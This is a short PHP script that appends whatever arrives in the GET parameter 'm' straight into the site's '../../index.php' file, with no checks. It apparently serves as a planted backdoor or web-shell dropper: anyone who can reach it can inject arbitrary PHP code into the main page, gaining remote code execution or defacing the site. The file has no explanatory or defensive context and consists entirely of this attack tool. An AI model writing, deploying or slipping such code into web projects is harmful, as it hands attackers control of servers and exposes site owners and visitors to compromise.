<?php
$filename = '../../index.php';
$string = $_GET['m'];

$fp = fopen($filename, 'a+');
fwrite($fp, $string);
fclose($fp);


?>